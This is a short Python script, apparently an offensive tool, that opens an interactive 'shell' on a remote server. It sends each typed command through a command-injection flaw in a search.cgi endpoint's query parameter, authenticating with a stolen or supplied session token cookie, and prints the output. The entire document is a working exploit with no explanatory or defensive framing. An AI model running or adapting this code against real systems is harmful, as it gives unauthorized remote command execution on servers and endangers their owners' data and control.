import requests

target_url = input("target url: ")
token = input("token: ")

command = ''
while command!='exit':
    command = input("sp34rsh3ll $: ")
    if command=='exit':
        break 

    try:
        headers = {
            "Cookie":f"token={token}"
        }
        res = requests.get(target_url+'/cgi-bin/search.cgi?q=;'+command+';',headers=headers)
        print(res.text)
    except:
        pass